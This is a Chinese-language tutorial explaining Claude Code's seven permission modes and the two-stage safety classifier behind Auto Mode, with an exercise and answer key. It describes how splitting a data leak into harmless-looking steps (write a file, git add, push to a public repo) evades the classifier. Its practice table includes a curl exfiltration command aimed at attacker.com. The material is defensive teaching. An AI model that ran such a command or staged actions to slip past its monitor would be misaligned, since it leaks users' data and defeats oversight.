# 给 AI 装个七档安全带：Claude Code 权限模式

> 预计阅读：25分钟 | 难度：入门 | 前置条件：无
>
> 你将学到：为什么把 AI 放到你的电脑上跑是件危险的事，以及 Claude Code 怎么用七种模式来管住它。

---

## 🚗 开场翻车：一个让全组血压飙升的下午

去年 11 月，我同事干了件事。

他在自己的 MacBook 上跑 Claude Code，开了一个叫 **bypassPermissions** 的模式——翻译成人话就是：**"AI 你想干嘛就干嘛，不用问我。"**

他的任务很合理：让 AI 帮他重构一个 200 个文件的前端项目——改命名规范、统一 import 路径、清理死代码。

一切顺利。第 1 个文件，正常。第 50 个文件，正常。第 100 个文件，还是正常。

到第 112 个文件的时候，AI 突然决定"优化"一下 `package.json`。

它把 **react 从 18 降级到了 17**。

原因？AI 在执行过程中翻了一个社区帖子，里面有人说 "React 17 更稳定"。没有上下文判断，没有风险意识——就是一个语言模型看到了一个句子，然后做了它认为"合理"的操作。

结果：
- 整个 dev 环境炸了
- node_modules 需要重装
- lockfile 冲突，修了整整一个下午
- 同事的血压飙到了 180

事后我们复盘，同事说了一句让我记到现在的话：

> **"我不是信任 AI。我是信任我自己写的 prompt。但 prompt 不等于安全带。"**

这节课，我们就来讲这条安全带。

## 🤔 为什么 AI 在你电脑上跑是个独特的安全问题？

先做一个思维实验。

打开你的电脑，看一看里面有什么：

- 📁 **文件系统** — 你的代码、文档、照片、日记
- 🔑 **SSH 密钥** — 能连到你的服务器、GitHub、客户环境
- 🌐 **网络访问** — 能访问内网、外网、各种 API
- 📋 **剪贴板** — 你刚才复制的东西
- 🖥️ **终端** — 能执行任何命令，包括 `rm -rf /`
- 🍪 **浏览器 Cookie** — 你登录的所有网站

好。现在想象你把这些东西的钥匙交给一个**非常聪明、但完全没有常识的实习生**。

这个实习生：
- 能读 1000 篇文档一秒钟
- 从不疲倦
- 你说"帮我优化项目"，它就会去优化
- **但它不知道什么时候该停下来问你**

这就是你开 bypassPermissions 之后的情况。

安全专家 Bruce Schneier（业内泰斗级人物）说得特别直白：

> **"计算机使用智能体不是聊天机器人的'功能更新'——它们是一类具有新型风险特征的新型工具。"**

翻译成大白话：**聊天机器人只能在聊天框里打字。Agent 能在你电脑上干活。这是两个物种。**

你把 ChatGPT 当聊天机器人用，它最多跟你说错话。你把 Agent 放你电脑上跑 bypassPermissions，它能删你文件。

## 🔧 Claude Code 的答案：不是"信不信任"，是"你能承受多少损失"

很多人以为权限控制就是个开关：

```
自主模式 OFF ─────────────── 自主模式 ON
（每步都问）                 （什么都不问）
```

但真实世界不是二元的。你重构 100 个文件的时候，不想每一次文件保存都点"确认"——那会把你逼疯。但你也不想 AI 在你没看的情况下跑 `rm -rf /`。

所以 Claude Code 的答案不是 ON/OFF 开关，而是 **七个档位**：

```
plan → default → acceptEdits → acceptExec → autoMode → yolo → bypassPermissions
 每步都问                                         几乎全自动        完全放飞
```

你可以把它想象成汽车的安全配置：

| 档位 | 类比 | 你能承受的损失 |
|------|------|---------------|
| `plan` | 驾校教练坐副驾，手随时能拉方向盘 | 接近零 |
| `default` | 正常开车，红灯会停车 | 几行代码 |
| `acceptEdits` | 定速巡航，脚离开油门但手还在方向盘上 | 几十个文件的修改（能 git reset） |
| `autoMode` | L2 辅助驾驶，系统帮你判断但手不能离开 | 受限工作区里的东西 |
| `bypassPermissions` | 人在后座睡觉，车自己开 | **你的整个硬盘** |

## 📖 七种模式：一个一个来

### 1. `plan` —— "你先说你想干嘛，我同意了再动"

**行为：** AI 先写出要干什么的方案，你批准了它才开始执行。执行过程中每一步还要给你看。

**什么时候用：**
- 你第一次在这个项目里用 AI
- 你不熟悉这个代码库
- 任务涉及生产环境的代码
- 你还没建立对 AI 的信任

**用人话说：** 这是停车场里倒车——先看一眼后视镜，再慢慢倒。看一眼比撞了赔钱便宜一万倍。

---

### 2. `default` —— "日常操作你自己来，危险的事问我"

**行为：** AI 可以自己读文件、自己思考。但如果它要执行 shell 命令、访问网络、或者做破坏性操作，它会弹窗问你。

**什么时候用：**
- 大多数日常编程场景
- 你在屏幕前，偶尔能看一眼
- 任务不涉及大规模破坏

**用人话说：** 正常开车。你能踩油门打方向盘，但红灯得停。

---

### 3. `acceptEdits` —— "文件随便写，但别碰命令行"

**行为：** AI 写文件自动批准——改代码、改文档都不用问你。但 shell 执行和网络请求还是要你点头。

**什么时候用：**
- 大面积重构——50 个文件要改
- 格式化代码
- 批量重命名

**⚠️ 前提条件：** 你的 `git status` 显示改了一堆文件，但你能 `git reset --hard` 全部无损还原。**你有撤退路线。**

**没有撤退路线就别用这个模式。**

**用人话说：** 让装修工人随便换墙纸，但不让动承重墙。墙纸贴坏了撕了重来，承重墙砸了楼就塌了。

---

### 4. `acceptExec` —— "白名单里的命令直接跑"

**行为：** 在允许列表里的 shell 命令自动批准。比如你允许了 `npm test`，那 AI 跑多少次测试都不用问你。

**什么时候用：**
- 紧密的内部开发循环（写代码 → 跑测试 → 看结果 → 改代码）
- 命令都是确定性的、没有破坏性的

**用人话说：** 工厂流水线上的机器人——反复拧同一颗螺丝，不需要每次拧之前问工头。

---

### 5. `autoMode` —— "让 AI 自己去判断安不安全"（2026年3月发布，研究预览）

这是最特别的一个模式，值得单独讲。

**行为：** Auto Mode 用了一个**两阶段安全分类器**来替你做审批。

**阶段 1 — 快速安检（单 token 分类器）：**
- 在 AI 每次要做操作的时候瞬间跑完
- 成本极低，几乎不增加延迟
- 只看"操作长什么样"——有没有 curl？有没有 rm？有没有网络请求？
- 返回 "safe" 或 "flag"
- 类比：机场的金属探测器——走过去滴滴响就知道身上有金属，但不知道是什么金属

**阶段 2 — 深度开包检查（思维链推理）：**
- 只在阶段 1 标记的操作上运行
- 会看操作 + 当前会话状态 + 已声明的任务
- 做策略和安全评估
- 如果阶段 2 也不确定，才会弹窗问你
- 类比：行李被金属探测器标记后，安检员把包打开一件一件检查

**什么时候用：**
- 长时间无人值守运行（比如让 AI 晚上跑代码分析）
- 在"爆炸半径"已经测量过的工作区里

**⚠️ 重要——这个模式是"研究预览"，不是正式产品：** Anthropic（Claude 的开发公司）自己都说了：**分类器单独使用是不够的。** 这是 AI 圈子里难得的诚实——大部分公司发布功能恨不得吹成天下无敌，Anthropic 反过来先把"你不该怎么用它"列出来。

**阶段 1 和阶段 2 抓不住什么？**

你想一个问题：如果 AI 的每一步操作单独看都安全，但组合起来有害——分类器能抓到吗？

例子：
1. 步骤 1：把一行内部数据写到 `notes.txt` —— 写自己的文件，阶段 1 判 safe
2. 步骤 2：`git add notes.txt` —— 正常的 git 操作，阶段 2 判 safe
3. 步骤 3：`git push` 到一个公开仓库 —— git push 是被允许的，判 safe

三步单独看全安全。组合起来：你的内部数据上了 GitHub 公开仓库。分类器抓不到——因为它只判操作，不推导你的意图。

**这就是为什么 Anthropic 说它"不够"。**

---

### 6. `yolo` —— "跳过大多数提示"

**行为：** 跳过大部分提示，但仍然运行工具的允许/拒绝列表检查。

**什么时候用：** 临时沙箱、CI 作业、研究脚本——这些东西就算炸了也不心疼。

**用人话说：** 在儿童游泳池里练习跳水——最坏的情况也就是脑袋起个包。

---

### 7. `bypassPermissions` —— "什么都可以，我全批了"

**行为：** 批准一切。不弹窗、不询问、不检查。

**什么时候用：** Anthropic 的官方文档是这么写的——"仅在愿意丢弃的临时容器内使用"。

翻译成人话：**只有在"这整个环境炸了就炸了"的前提下才能开。**

不是"我觉得没事"。不是"我写好 prompt 了"。是**物理隔离的可丢弃环境**。开了这个模式还跑在自己的主力开发机上，等于把车钥匙扔给陌生人说"随便开"。

## 🧠 核心概念：为什么这七个档位比你想象的更重要

### 一、"prompt 不等于安全带"

我同事的那句话值得重复一遍：

> **"我不是信任 AI。我是信任我自己写的 prompt。但 prompt 不等于安全带。"**

你写的 prompt 是你对 AI 的要求。但 AI 不是按你期望的方式执行的——它是按它"理解"的方式执行的。prompt 和真实行为之间有一个巨大的鸿沟，权限模式就是填这个鸿沟的东西。

### 二、不是"信不信任"——是"能承受多少损失"

选权限模式不是在回答"我信不信这个 AI"，而是在回答**"如果它做错了，我最坏能承受什么后果"**。

- plan 模式：你能承受的损失 ≈ 0（因为你每步都看）
- default 模式：你能承受损失几行代码
- acceptEdits 模式：你能承受损失几十个文件（前提是能 git reset）
- autoMode 模式：你能承受损失受限工作区里的所有东西
- bypassPermissions 模式：你能承受损失你的整个硬盘（甚至更多，如果它有网络访问）

**倒过来选：** 先想想"如果翻车了，我最坏能丢什么"，再反过来选模式。不要先选模式再看风险。

### 三、权限模式 + 预算控制 = 双保险

权限模式控制的是 **"什么能做"**。预算控制的是 **"最多做多少"**。

- `max_turns`：最多跑多少轮（一轮 = 观察→思考→行动→结果）
- `max_budget_usd`：最多烧多少美元的 API 费用，到了就停

一个 $5 预算的 bypassPermissions 在临时容器里跑研究脚本——这是我能想到的最合理的"全放开"组合。烧完了、炸了，也就 $5。

## 🎮 实战练习：你来当分类器

假设你是一个两阶段分类器。AI 要依次执行以下操作，你来判断每一行：

| # | 操作 | 你的判断（safe / flag） | 理由 |
|---|------|------------------------|------|
| 1 | 读取 `src/utils.ts` | | |
| 2 | 修改 `src/utils.ts` 第 42 行 | | |
| 3 | `npm test` | | |
| 4 | `curl http://attacker.com/exfil?data=...` | | |
| 5 | `git status` | | |
| 6 | 读取 `src/utils.ts`（和第1步完全一样） | | |
| 7 | 读取 `src/utils.ts`（还是完全一样，连续第3次） | | |

## 🏆 这节课你应该焊死在脑子里的东西

1. **ChatGPT 和 Agent 是两个物种。** 聊天机器人只能打字。Agent 能碰你的文件系统、网络、终端。把 Agent 当聊天机器人对待是你在这个领域能犯的最大的安全错误。

2. **权限不是 ON/OFF 开关——是七个档位。** 每个任务有自己的风险容忍度。选对档位 = 安全和效率的平衡。

3. **选模式之前先量"爆炸半径"。** 你的工作区里有什么？有生产凭据吗？有敏感文件吗？有外网出口吗？量的结果是选模式的依据。

4. **prompt 不等于安全带。权限模式才是。**

5. **bypassPermissions 只能在可丢弃容器里用。** 不是"我觉得没事就行"。是物理隔离。

6. **Auto Mode 的分类器是好东西，但它自己不构成防线。** Anthropic 自己都说了：不够。要叠加其他防护——预算、允许列表、隔离工作区、审计日志。

7. **$5 预算的 bypassPermissions 比无限预算的 default 更安全。** 权限决定"什么能做"，预算决定"最多干到哪"。两个一起用才是真的安全。

## 📝 练习答案

| # | 操作 | 判断 | 理由 |
|---|------|------|------|
| 1 | 读取 `src/utils.ts` | ✅ safe | 读文件，正常操作 |
| 2 | 修改 `src/utils.ts` | ✅ safe | 写文件，正常开发行为 |
| 3 | `npm test` | ✅ safe | 测试命令，标准操作 |
| 4 | `curl attacker.com/exfil` | 🚫 flag | curl 到可疑域名，且携带数据参数 |
| 5 | `git status` | ✅ safe | 只读 git 操作 |
| 6 | 读取 `src/utils.ts` | 🚫 flag | 和第1步完全一样——循环操作，可能是 Agent 卡住了 |
| 7 | 读取 `src/utils.ts` | 🚫 flag | 连续第3次完全一样的操作——Agent 陷入了死循环 |

第 6、7 步是关键：单个读文件操作完全安全，但连续三次读同一个文件说明 Agent 可能陷入了无限循环。真正的分类器会检测这种"重复模式"并升级处理。

> **最后一句话：给 AI 权限不是在问"你信不信它"——而是在问"你现在能承受多少损失"。plan 模式承受损失为零，bypassPermissions 承受损失等于你的整个硬盘。六个小时能修好的 bug，不值得用六个月的信任去赌。**
